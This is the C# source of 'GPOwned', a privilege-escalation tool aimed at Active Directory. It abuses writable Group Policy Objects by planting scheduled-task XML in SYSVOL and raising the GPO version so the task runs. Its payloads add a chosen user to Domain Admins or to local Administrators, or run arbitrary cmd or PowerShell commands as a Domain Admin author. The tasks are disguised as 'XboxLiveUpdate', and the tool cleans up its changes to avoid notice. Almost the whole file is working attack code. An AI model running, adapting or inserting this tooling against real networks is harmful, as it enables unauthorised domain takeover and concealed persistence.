using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using GPOwned.Shared;

namespace GPOwned
{
    internal static class Program
    {
        private const string ExtToAdd =
            "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]" +
            "[{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]";

        static int Main(string[] args)
        {
            Output.EnableAnsi();
            Output.Banner("GPOwned", "GPO Privilege Escalation Tool  ·  @n0troot");

            if (args.Length == 0 || HasFlag(args, "--help", "-h", "-help"))
            {
                ShowHelp();
                return 0;
            }

            string guid        = GetArg(args, "--guid",    "-guid");
            string gpoName     = GetArg(args, "--gpo",     "-gpo");
            string computer    = GetArg(args, "--computer","-c");
            string domainArg   = GetArg(args, "--domain",  "-d");
            string user        = GetArg(args, "--user",    "-u");
            string author      = GetArg(args, "--author",  "-a");
            string intervalStr = GetArg(args, "--interval","-int");
            string xmlPath     = GetArg(args, "--xml",     "-xml");
            string stxPath     = GetArg(args, "--stx",     "-stx");
            string scmd        = GetArg(args, "--scmd",    "-scmd");
            string sps         = GetArg(args, "--sps",     "-sps");
            string cmdArg      = GetArg(args, "--cmd",     "-cmd");
            string psArg       = GetArg(args, "--ps",      "--powershell", "-ps");

            // Single quotes in payload args become double quotes in the generated XML.
            // Lets callers write: --scmd "net group 'Domain Admins' user /add /dom"
            if (scmd   != null) scmd   = scmd.Replace('\'', '"');
            if (sps    != null) sps    = sps.Replace('\'', '"');
            if (cmdArg != null) cmdArg = cmdArg.Replace('\'', '"');
            if (psArg  != null) psArg  = psArg.Replace('\'', '"');

            string logPath     = GetArg(args, "--log",     "-log");
            bool   da          = HasFlag(args, "--da",   "-da");
            bool   local       = HasFlag(args, "--local","-local");

            if (string.IsNullOrEmpty(guid) && string.IsNullOrEmpty(gpoName))
            {
                Output.Red("Must supply either --guid or --gpo.");
                ShowHelp();
                return 1;
            }
            if (string.IsNullOrEmpty(computer))
            {
                Output.Red("--computer / -c is required.");
                ShowHelp();
                return 1;
            }

            int interval = 90;
            int iv;
            if (!string.IsNullOrEmpty(intervalStr) && int.TryParse(intervalStr, out iv))
                interval = iv;

            bool hasPayload = da || local ||
                              !string.IsNullOrEmpty(cmdArg)  ||
                              !string.IsNullOrEmpty(psArg)   ||
                              !string.IsNullOrEmpty(stxPath);
            if (!hasPayload)
            {
                Output.Red("Must supply a payload: --da, --local, --cmd, --ps, or --stx.");
                ShowHelp();
                return 1;
            }
            if (!string.IsNullOrEmpty(stxPath) &&
                string.IsNullOrEmpty(scmd) && string.IsNullOrEmpty(sps))
            {
                Output.Red("--stx requires either --scmd or --sps.");
                return 1;
            }

            TeeWriter tee = null;
            if (!string.IsNullOrEmpty(logPath))
                tee = new TeeWriter(logPath);

            int exitCode = 1;
            try
            {
                exitCode = Run(guid, gpoName, computer, domainArg, user, author, interval,
                               xmlPath, stxPath, scmd, sps, cmdArg, psArg, da, local);
            }
            catch (Exception ex)
            {
                Output.Red("Unexpected error: " + ex.Message);
            }
            finally
            {
                if (tee != null) tee.Stop();
            }
            return exitCode;
        }

        static int Run(
            string guid, string gpoName, string computer, string domainArg,
            string user, string author, int interval,
            string xmlPath, string stxPath, string scmd, string sps,
            string cmdArg, string psArg, bool da, bool local)
        {
            // ── 1. Domain info ────────────────────────────────────────────────────
            string domain, domainDN;
            try
            {
                AdHelper.GetDomainInfo(out domain, out domainDN);
            }
            catch (Exception ex)
            {
                Output.Red("Failed to contact domain controller: " + ex.Message);
                return 1;
            }
            if (!string.IsNullOrEmpty(domainArg))
                domain = domainArg;

            // ── 2. Resolve GPO GUID ───────────────────────────────────────────
            if (!string.IsNullOrEmpty(gpoName) && string.IsNullOrEmpty(guid))
            {
                guid = AdHelper.ResolveGpoGuid(gpoName, domainDN);
                if (string.IsNullOrEmpty(guid))
                {
                    Output.Red("Failed to find GPO with name: " + gpoName);
                    return 1;
                }
                Output.Green("Resolved GPO '" + gpoName + "' to GUID: " + guid);
            }

            string guidClean  = guid.Trim('{', '}');
            string guidBraced = "{" + guidClean + "}";

            Output.SectionHeader("Preflight Checks");

            // ── 3. ACL check ─────────────────────────────────────────────────────
            if (!AdHelper.CheckGpoWriteAccess(guidBraced, domainDN))
            {
                Output.Red("No write access to this GPO. Aborting.");
                return 1;
            }
            Output.Green("Write access confirmed on GPO " + guidBraced);

            // ── 4. GPO enabled status ─────────────────────────────────────────────
            int flags        = AdHelper.GetGpoFlags(guidBraced, domainDN);
            bool flagsChanged = (flags & 2) == 2;
            if (flagsChanged)
            {
                AdHelper.SetGpoFlags(guidBraced, domainDN, 0);
                Output.Green("GPO computer settings were disabled — re-enabled.");
            }
            else
            {
                Output.Gray("GPO status: AllSettingsEnabled");
            }

            // ── 5. Back up extension names ──────────────────────────────────────
            string initialExt = AdHelper.GetGpoExtensionNames(guidBraced, domainDN);
            bool noExt = string.IsNullOrEmpty(initialExt);

            Output.Gray("gPCMachineExtensionNames: " + (noExt ? "<not set>" : initialExt));

            // ── 6. Find DA author ──────────────────────────────────────────────
            string daUser = author;
            if (string.IsNullOrEmpty(daUser))
            {
                daUser = AdHelper.FindFirstActiveDomainAdmin(domainDN);
                if (string.IsNullOrEmpty(daUser))
                {
                    Output.Red("Could not find an active Domain Admin account.");
                    return 1;
                }
            }
            Output.Gray("Task author  : " + daUser);
            Output.Gray("Target DC    : " + computer);

            // ── 7. Load & validate primary XML ─────────────────────────────────
            string xmlContent;
            if (!string.IsNullOrEmpty(xmlPath))
            {
                if (!File.Exists(xmlPath))
                {
                    Output.Red("XML file not found: " + xmlPath);
                    return 1;
                }
                xmlContent = File.ReadAllText(xmlPath, Encoding.ASCII);
            }
            else
            {
                xmlContent = LoadEmbeddedText("ScheduledTasks.xml", Encoding.UTF8);
            }

            if (!xmlContent.TrimStart().StartsWith("<?xml version", StringComparison.OrdinalIgnoreCase))
            {
                Output.Red("XML file empty or corrupted.");
                return 1;
            }
            Output.Green("XML template validated.");

            Output.SectionHeader("Payload Deployment");

            // ── 8. Deploy primary XML to SYSVOL ──────────────────────────────────
            string sysvolXmlPath = SysvolHelper.ScheduledTasksPath(domain, guidBraced);
            bool backedUp = SysvolHelper.DeployXml(xmlContent, sysvolXmlPath, Encoding.ASCII);
            Output.Green("ScheduledTasks.xml deployed to SYSVOL" + (backedUp ? " (existing file backed up)" : "") + ".");

            // ── 9. Deploy second-task files if --stx ─────────────────────────────
            if (!string.IsNullOrEmpty(stxPath))
            {
                string wsaddContent;
                if (File.Exists(stxPath))
                    wsaddContent = File.ReadAllText(stxPath, Encoding.Unicode);
                else
                    wsaddContent = LoadEmbeddedText("wsadd.xml", Encoding.UTF8);

                if (!wsaddContent.TrimStart().StartsWith("<?xml version", StringComparison.OrdinalIgnoreCase))
                {
                    Output.Red("Second XML file empty or corrupted.");
                    return 1;
                }
                Output.Green("Second XML file is valid.");

                string boundary    = DateTime.Now.AddMinutes(1).ToString("s");
                string wsaddFilePath = SysvolHelper.WsaddPath(domain, guidBraced);
                string cmdType    = !string.IsNullOrEmpty(scmd) ? "cmd.exe"       : "powershell.exe";
                string argument   = !string.IsNullOrEmpty(scmd) ? scmd            : sps;

                string addBat = BuildAddBat(domain, guidBraced);
                SysvolHelper.DeploySecondTaskFiles(domain, guidBraced, wsaddContent, addBat);

                var wsaddTokens = new Dictionary<string, string>();
                wsaddTokens["changedomain"]  = domain;
                wsaddTokens["changeuser"]    = daUser;
                wsaddTokens["autoremove"]    = boundary;
                wsaddTokens["commandtype"]   = cmdType;
                wsaddTokens["argumentspace"] = argument;
                SysvolHelper.PatchXml(wsaddFilePath, wsaddTokens, Encoding.Unicode);
            }

            // ── 10. Patch primary ScheduledTasks.xml based on mode ──────────────────
            var tokens = BuildPrimaryTokens(da, local, stxPath, cmdArg, psArg,
                                            user, daUser, computer, domain, guidBraced);
            if (tokens == null)
            {
                SysvolHelper.RestoreScheduledTasks(domain, guidBraced, backedUp);
                return 1;
            }

            SysvolHelper.PatchXml(sysvolXmlPath, tokens, Encoding.ASCII);

            if (!File.Exists(sysvolXmlPath))
            {
                Output.Red("Cannot verify SYSVOL write — aborting.");
                SysvolHelper.RestoreScheduledTasks(domain, guidBraced, backedUp);
                return 1;
            }

            Output.SectionHeader("Activating GPO");

            // ── 11. Update AD versionNumber ───────────────────────────────────────
            try
            {
                int currentVer = AdHelper.GetGpoVersionNumber(guidBraced, domainDN);
                int newVer = currentVer + 1;
                AdHelper.SetGpoVersionNumber(guidBraced, domainDN, newVer);
                int verifiedVer = AdHelper.GetGpoVersionNumber(guidBraced, domainDN);
                if (verifiedVer != newVer)
                    throw new Exception("versionNumber write verification failed.");
                Output.Green("AD versionNumber: " + currentVer + " → " + verifiedVer);
            }
            catch (Exception ex)
            {
                Output.Red("Failed to update GPO AD versionNumber: " + ex.Message);
                SysvolHelper.RestoreScheduledTasks(domain, guidBraced, backedUp);
                return 1;
            }

            // ── 12. Update GPT.INI ──────────────────────────────────────────────
            SysvolHelper.UpdateGptIni(domain, guidBraced);
            Output.Green("GPT.INI version incremented.");

            // ── 13. Update gPCMachineExtensionNames ─────────────────────────────
            AdHelper.SetGpoExtensionNames(guidBraced, domainDN,
                ExtToAdd + (initialExt != null ? initialExt : ""));

            string finalExt = AdHelper.GetGpoExtensionNames(guidBraced, domainDN);
            if (finalExt != null && finalExt.StartsWith("[{00000000", StringComparison.Ordinal))
                Output.Green("gPCMachineExtensionNames updated.");
            else
            {
                Output.Red("Failed to write gPCMachineExtensionNames!");
                if (noExt) AdHelper.ClearGpoExtensionNames(guidBraced, domainDN);
                else       AdHelper.SetGpoExtensionNames(guidBraced, domainDN, initialExt);
                SysvolHelper.RestoreScheduledTasks(domain, guidBraced, backedUp);
                return 1;
            }

            // ── 14. Poll loop ──────────────────────────────────────────────────────
            Output.SectionHeader("Waiting for Execution");
            Poll(da, local, stxPath, cmdArg, psArg, user, computer, domainDN, computer, interval);

            // ── 15. Cleanup ───────────────────────────────────────────────────────
            Output.SectionHeader("Cleanup");

            if (noExt)
                AdHelper.ClearGpoExtensionNames(guidBraced, domainDN);
            else
                AdHelper.SetGpoExtensionNames(guidBraced, domainDN, initialExt);

            if (noExt)
                Output.Green("gPCMachineExtensionNames cleared.");
            else
                Output.Green("gPCMachineExtensionNames reverted.");

            Output.Gray("XboxLiveUpdate (GPP ImmediateTask) self-removes after execution.");
            if (!string.IsNullOrEmpty(stxPath))
                Output.Gray("XboxLiveUpdateWatchdog EndBoundary set to T+1 min — self-deletes 5s after expiry.");

            SysvolHelper.RestoreScheduledTasks(domain, guidBraced, backedUp);

            if (flagsChanged)
            {
                AdHelper.SetGpoFlags(guidBraced, domainDN, flags);
                Output.Green("GPO flags restored to original value (" + flags + ").");
            }

            return 0;
        }

        static Dictionary<string, string> BuildPrimaryTokens(
            bool da, bool local, string stxPath,
            string cmdArg, string psArg,
            string user, string daUser, string computer,
            string domain, string guid)
        {
            var tokens = new Dictionary<string, string>();
            tokens["changedomain"] = domain;
            tokens["changeuser"]   = daUser;
            tokens["changedc"]     = computer;

            if (da)
            {
                if (string.IsNullOrEmpty(user))
                {
                    Console.Write("Supply user to elevate: ");
                    user = Console.ReadLine();
                    if (string.IsNullOrEmpty(user)) return null;
                }
                tokens["ownuser"]       = user;
                tokens["argumentspace"] = "/r net group \"Domain Admins\" " + user + " /add /dom";
                Output.Green("ScheduledTasks.xml modified to add " + user + " to Domain Admins.");
                return tokens;
            }

            if (local)
            {
                if (string.IsNullOrEmpty(user))
                {
                    Console.Write("Supply user to elevate: ");
                    user = Console.ReadLine();
                    if (string.IsNullOrEmpty(user)) return null;
                }
                tokens["ownuser"]       = user;
                tokens["argumentspace"] = "/r net localgroup Administrators " + user + " /add";
                Output.Green("ScheduledTasks.xml modified to add " + user + " to local Administrators on " + computer + ".");
                return tokens;
            }

            if (!string.IsNullOrEmpty(stxPath))
            {
                tokens["ownuser"]       = user != null ? user : "";
                tokens["argumentspace"] = @"/r \\" + domain + @"\SYSVOL\" + domain +
                                          @"\Policies\" + guid +
                                          @"\Machine\Preferences\ScheduledTasks\add.bat";
                Output.Green("ScheduledTasks.xml modified to run add.bat.");
                return tokens;
            }

            if (!string.IsNullOrEmpty(psArg))
            {
                string ps = psArg;
                if (ps.StartsWith("-c ", StringComparison.OrdinalIgnoreCase))
                    ps = ps.Substring(3);
                else if (ps.StartsWith("-Command ", StringComparison.OrdinalIgnoreCase))
                    ps = ps.Substring(9);

                tokens["ownuser"]       = user != null ? user : "";
                tokens["cmd.exe"]       = "powershell.exe";
                tokens["argumentspace"] = "-Command " + ps;
                Output.Green("ScheduledTasks.xml modified with PowerShell command.");
                return tokens;
            }

            if (!string.IsNullOrEmpty(cmdArg))
            {
                string cmd = cmdArg;
                if (cmd.StartsWith("/c ", StringComparison.OrdinalIgnoreCase))
                    cmd = cmd.Substring(3);
                else if (cmd.StartsWith("/r ", StringComparison.OrdinalIgnoreCase))
                    cmd = cmd.Substring(3);

                tokens["ownuser"]       = user != null ? user : "";
                tokens["argumentspace"] = "/r " + cmd;
                Output.Green("ScheduledTasks.xml modified with custom CMD command.");
                return tokens;
            }

            Output.Red("Must supply --da, --local, --cmd, --ps, or --stx.");
            return null;
        }

        static void Poll(
            bool da, bool local, string stxPath,
            string cmdArg, string psArg,
            string user, string computer,
            string domainDN, string dc, int interval)
        {
            if (da)
            {
                string targetUser = !string.IsNullOrEmpty(user) ? user : Environment.UserName;
                for (int x = 1; x <= interval; x++)
                {
                    Output.Progress(x, interval, "Polling for execution — do NOT close this window!");
                    Thread.Sleep(60000);
                    if (AdHelper.IsDomainAdmin(targetUser, domainDN)) { break; }
                }
                Output.EndProgress();
                Output.Green("Check Domain Admins group for confirmation.");
            }
            else if (local)
            {
                string targetUser = !string.IsNullOrEmpty(user) ? user : Environment.UserName;
                for (int x = 1; x <= interval; x++)
                {
                    Output.Progress(x, interval, "Polling for execution — do NOT close this window!");
                    Thread.Sleep(60000);
                    if (AdHelper.IsLocalAdmin(computer, targetUser)) { break; }
                }
                Output.EndProgress();
                Output.Green("Check local Administrators group on " + computer + " for confirmation.");
            }
            else if (!string.IsNullOrEmpty(cmdArg) || !string.IsNullOrEmpty(psArg))
            {
                for (int x = 1; x <= interval; x++)
                {
                    Output.Progress(x, interval, "Polling for execution — do NOT close this window!");
                    Thread.Sleep(60000);
                    if (TaskSchedulerHelper.TaskExists(dc, "XboxLiveUpdate")) { break; }
                }
                Output.EndProgress();
                Output.Green("Command executed (task XboxLiveUpdate appeared on DC).");
            }
            else if (!string.IsNullOrEmpty(stxPath))
            {
                string targetUser = !string.IsNullOrEmpty(user) ? user : Environment.UserName;
                int wait = interval > 0 ? interval : 180;
                for (int x = 1; x <= wait; x++)
                {
                    Output.Progress(x, wait, "Polling for execution — do NOT close this window!");
                    Thread.Sleep(60000);
                    if (AdHelper.IsDomainAdmin(targetUser, domainDN)) { break; }
                }
                Output.EndProgress();
                Output.Green("Check Domain Admins group for confirmation.");
            }
        }

        static string BuildAddBat(string domain, string guid)
        {
            return "powershell -NoProfile -ExecutionPolicy Bypass -Command " +
                   "\"Start-Process powershell -Verb RunAs -ArgumentList " +
                   "\"($Task=Get-Content '\\\\" + domain + "\\sysvol\\" + domain +
                   "\\Policies\\" + guid +
                   "\\Machine\\Preferences\\ScheduledTasks\\wsadd.xml' -raw); " +
                   "Register-ScheduledTask -Xml $Task -TaskName XboxLiveUpdateWatchdog\"";
        }

        static string LoadEmbeddedText(string logicalName, Encoding enc)
        {
            var asm = Assembly.GetExecutingAssembly();
            using (var stream = asm.GetManifestResourceStream(logicalName))
            using (var reader = new StreamReader(stream, enc))
                return reader.ReadToEnd();
        }

        static string GetArg(string[] args, params string[] flags)
        {
            for (int i = 0; i < args.Length - 1; i++)
                foreach (string f in flags)
                    if (args[i].Equals(f, StringComparison.OrdinalIgnoreCase))
                        return args[i + 1];
            return null;
        }

        static bool HasFlag(string[] args, params string[] flags)
        {
            foreach (string a in args)
                foreach (string f in flags)
                    if (a.Equals(f, StringComparison.OrdinalIgnoreCase))
                        return true;
            return false;
        }

        static void ShowHelp()
        {
            Console.WriteLine(@"
GPOwned.exe - GPO Privilege Escalation Tool

IDENTITY (one required):
  --guid <GUID>           GPO GUID (with or without braces)
  --gpo  <name>           GPO display name

TARGET:
  --computer / -c <fqdn>  Target computer FQDN (required)
  --domain   / -d <fqdn>  Target domain FQDN   (default: current forest root)
  --user     / -u <user>  User to elevate (required for --da and --local)
  --author   / -a <user>  DA account for task author (auto-detected if omitted)
  --interval / -int <n>   Minutes to wait (default: 90)

PAYLOAD (one required):
  --da                    Add --user to Domain Admins
  --local                 Add --user to local Administrators on --computer
  --cmd  <command>        Execute a CMD command
  --ps   <command>        Execute a PowerShell command

SECOND XML TECHNIQUE:
  --stx  <path|.>         wsadd.xml path (. = use embedded). Triggers second-task technique.
  --scmd <command>        CMD command for second XML
  --sps  <command>        PowerShell command for second XML

MISC:
  --xml  <path>           Custom ScheduledTasks.xml (default: embedded template)
  --log  <path>           Log all output to file
  --help / -h             Show this help

EXAMPLES:
  DA escalation via DC-linked GPO:
    GPOwned.exe --gpo ""Default Domain Policy"" --computer dc01.domain.local --user jdoe --da

  Local admin via workstation GPO:
    GPOwned.exe --guid {387547AA-B67F-4D7B-A524-AE01E56751DD} --computer pc01.domain.local --user jdoe --local

  Custom command:
    GPOwned.exe --gpo ""My GPO"" --computer dc01.domain.local --cmd ""whoami > C:\out.txt""

  Second-task (DA via workstation with DA session):
    GPOwned.exe --guid {D552AC5B-CE07-4859-9B8D-1B6A6BE1ACDA} --computer pc01.domain.local --author DAUser --stx . --scmd ""/r net group \"\"domain admins\"\" jdoe /add /dom""
");
        }
    }
}
